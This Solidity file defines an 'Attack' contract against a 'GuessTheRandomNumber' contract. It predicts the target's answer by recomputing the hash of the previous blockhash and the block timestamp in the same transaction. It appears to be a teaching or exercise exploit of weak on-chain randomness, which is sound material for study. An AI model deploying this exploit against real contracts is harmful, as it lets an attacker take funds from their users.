//SPDX-License-Identifier:MIT
pragma solidity ^0.8.2;
interface GuessTheRandomNumber{
    function guess(uint _guess)external;
}
contract Attack{
 GuessTheRandomNumber  Random;
    constructor(address target){
        Random = GuessTheRandomNumber(target);

    }
    function guess()public {
       uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        Random.guess(answer);
       
    }
    receive() external payable{}
    fallback() external payable{}

}
